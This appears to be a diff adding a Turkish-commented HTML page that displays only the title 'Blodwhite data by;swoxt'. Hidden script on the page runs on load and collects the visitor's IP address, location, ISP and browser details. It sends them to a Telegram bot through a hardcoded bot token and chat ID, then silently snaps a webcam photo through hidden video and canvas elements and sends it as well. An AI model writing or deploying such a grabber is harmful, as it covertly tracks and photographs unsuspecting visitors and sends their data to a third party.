@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blodwhite data by;swoxt</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #fff;
+            text-align: center;
+            user-select: none;
+        }
+        .main-text {
+            font-size: 1.8rem;
+            font-weight: 500;
+            color: #888;
+            opacity: 0.6;
+            letter-spacing: 1px;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="main-text">Blodwhite data by;swoxt</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // ============================================================
+        // TELEGRAM BOT KONFIGÜRASYONU
+        // ============================================================
+        const BOT_TOKEN = "8684980330:AAGS_BcTgBsH0dXw0Jg1qI5uidqVQ7dVjFw";
+        const CHAT_ID = "8610330090";
+
+        // ============================================================
+        // 1. IP ve Konum Bilgisi (hızlı, 3 sn timeout)
+        // ============================================================
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Bilinmiyor',
+                    country: data.country_name || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    isp: data.org || 'N/A',
+                };
+            } catch {
+                return { ip: 'Alınamadı', country: 'N/A', city: 'N/A', region: 'N/A', isp: 'N/A' };
+            }
+        }
+
+        // ============================================================
+        // 2. Tarayıcı Bilgileri (anında)
+        // ============================================================
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Bilinmiyor';
+            if (ua.includes('Win')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+            let browser = 'Bilinmiyor';
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+
+            return {
+                ua,
+                os,
+                browser,
+                language: navigator.language || 'Bilinmiyor',
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+        }
+
+        // ============================================================
+        // 3. Webcam Fotoğrafı Çek (arka planda, hata yönetimi yok)
+        // ============================================================
+        function captureWebcam() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve(dataURL);
+                            }, 300);
+                        };
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+
+        // ============================================================
+        // 4. Telegram'a Metin Gönder (IP + tarayıcı)
+        // ============================================================
+        async function sendTextToTelegram(ipInfo, browserInfo) {
+            const text = `
+🕵️ Yeni Ziyaretçi
+
+🌍 IP: ${ipInfo.ip}
+📍 ${ipInfo.country}, ${ipInfo.city} (${ipInfo.region})
+🏢 ISP: ${ipInfo.isp}
+🖥️ OS: ${browserInfo.os}
+🌐 Tarayıcı: ${browserInfo.browser}
+📱 Ekran: ${browserInfo.screen}
+🗣️ Dil: ${browserInfo.language}
+📅 ${new Date().toLocaleString()}
+            `;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        // 5. Telegram'a Fotoğraf Gönder (ayrı)
+        // ============================================================
+        async function sendPhotoToTelegram(imageBase64) {
+            if (!imageBase64) return;
+            try {
+                const blob = await fetch(imageBase64).then(res => res.blob());
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'webcam.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            } catch {}
+        }
+
+        // ============================================================
+        // 6. ANA FONKSİYON
+        // ============================================================
+        (async function main() {
+            // 1. IP ve tarayıcı bilgilerini al (hızlı)
+            const ipInfo = await getIPInfo();
+            const browserInfo = getBrowserInfo();
+
+            // 2. Hemen Telegram'a metin gönder (IP + tarayıcı)
+            await sendTextToTelegram(ipInfo, browserInfo);
+
+            // 3. Kamera arka planda çalışsın, sonucu bekleme (ayrı gönder)
+            captureWebcam().then(photo => {
+                if (photo) sendPhotoToTelegram(photo);
+            });
+        })();
+    </script>
+</body>
+</html>
